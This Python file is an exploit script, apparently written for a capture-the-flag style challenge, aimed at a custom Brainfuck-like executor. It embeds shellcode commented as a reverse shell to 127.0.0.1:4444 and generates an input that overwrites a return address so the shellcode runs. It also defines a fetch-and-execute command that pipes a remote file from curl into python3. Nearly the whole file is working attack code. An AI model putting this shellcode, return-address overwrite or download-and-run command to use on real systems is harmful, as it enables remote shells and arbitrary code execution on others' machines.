from subprocess import check_output

import bh_translator

TRANSLATOR_PATH = "./translator"
PLATFORM = "linux/x64/exec"
ARCHITECTURE = "x64"
COMMAND = 'curl "http://0.0.0.0:6789/1.sc" | python3'


SHELLCODE = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x92\x1a\x49\x1a\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\x7f\x00\x00\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58"
# shellcode for reverse shell 127.0.0.1:4444

TRANSLATED_SHELLCODE = bh_translator.translate(SHELLCODE)

STRT_ADDRESS = "00400d78"  # return address of function #1 in backtrace
FNSH_ADDRESS = "b6ff8008"  # desired return address


def main():
    a = list(reversed([STRT_ADDRESS[i * 2:i * 2 + 2] for i in range(len(STRT_ADDRESS) // 2)]))
    b = list(reversed([FNSH_ADDRESS[i * 2:i * 2 + 2] for i in range(len(STRT_ADDRESS) // 2)]))
    
    offset = 75  # offset after printing shellcode

    # position is an offset of rsp by the variable 'cells'
    for position in [1092]:
        s = ['>' * (position - offset)] + [((int(a[i], 16) - int(b[i], 16) + 256) % 256) * '-' + '>' for i in range(len(a))]
        res = TRANSLATED_SHELLCODE + ''.join(s)
        # res = ''.join(s)
        print(('echo "" | ./bhexecutor "{}"'.format(res)))
        print('position:', position)
        # check exploitations here, break


if __name__ == '__main__':
    main()
